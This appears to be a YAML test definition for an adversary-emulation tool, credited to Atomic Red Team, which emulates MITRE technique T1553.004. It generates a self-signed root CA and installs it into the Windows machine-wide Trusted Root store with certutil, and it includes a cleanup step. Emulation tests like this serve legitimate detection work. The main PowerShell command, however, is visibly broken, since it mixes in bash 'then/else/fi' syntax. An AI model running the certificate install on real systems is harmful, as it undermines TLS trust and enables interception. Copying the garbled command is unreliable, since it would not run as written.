- id: 5fdb1a7a-a93c-4fbe-aa29-ddd9ef94ed1f
  name: Install root CA on Windows with certutil
  description: 'Installs a root CA certificate into the machine-wide Trusted Root
    Certification

    Authorities store using certutil -f -addstore root.'
  tactic: defense-impairment
  technique:
    attack_id: T1553.004
    name: 'Subvert Trust Controls: Install Root Certificate'
  platforms:
    windows:
      psh:
        command: 'if (Test-Path "$env:TEMP\atomic_rootCA.cer") {exit 0} else {exit
          1}; then : ; else $root = New-SelfSignedCertificate -Subject "CN=Atomic
          Root CA" -CertStoreLocation Cert:\CurrentUser\My -KeyUsage CertSign -TextExtension
          @("2.5.29.19={critical}{text}ca=TRUE"); Export-Certificate -Cert $root -FilePath
          "$env:TEMP\atomic_rootCA.cer" -Type CERT; $root.Thumbprint | Out-File "$env:TEMP\T1553.004_rootCA_thumbprint.txt";
          Remove-Item "Cert:\CurrentUser\My\$($root.Thumbprint)"; fi; certutil.exe
          -f -addstore root "$env:TEMP\atomic_rootCA.cer"'
        cleanup: $rootThumb = Get-Content "$env:TEMP\T1553.004_rootCA_thumbprint.txt"
          -ErrorAction SilentlyContinue; if ($rootThumb) { Get-ChildItem "Cert:\LocalMachine\Root\$rootThumb"
          -ErrorAction SilentlyContinue | Remove-Item }; Remove-Item "#{root_cert_path}"
          -ErrorAction SilentlyContinue; Remove-Item "$env:TEMP\T1553.004_rootCA_thumbprint.txt"
          -ErrorAction SilentlyContinue
        elevation_required: true
  plugin: atomic
  singleton: false
  repeatable: true
  delete_payload: false
  privilege: ''
  buckets:
  - defense-impairment
  - atomic-red-team
  - t1553.004
  author: Atomic Red Team
  additional_info:
    input_arguments:
      root_cert_path:
        description: Path to the root CA certificate file
        type: path
        default: $env:TEMP\atomic_rootCA.cer
    dependencies:
    - description: 'Root CA certificate must be generated

        '
      prereq_command: 'if (Test-Path "#{root_cert_path}") {exit 0} else {exit 1}

        '
      get_prereq_command: '$root = New-SelfSignedCertificate -Subject "CN=Atomic Root
        CA" -CertStoreLocation Cert:\CurrentUser\My -KeyUsage CertSign -TextExtension
        @("2.5.29.19={critical}{text}ca=TRUE")

        Export-Certificate -Cert $root -FilePath "#{root_cert_path}" -Type CERT

        $root.Thumbprint | Out-File "$env:TEMP\T1553.004_rootCA_thumbprint.txt"

        Remove-Item "Cert:\CurrentUser\My\$($root.Thumbprint)"

        '
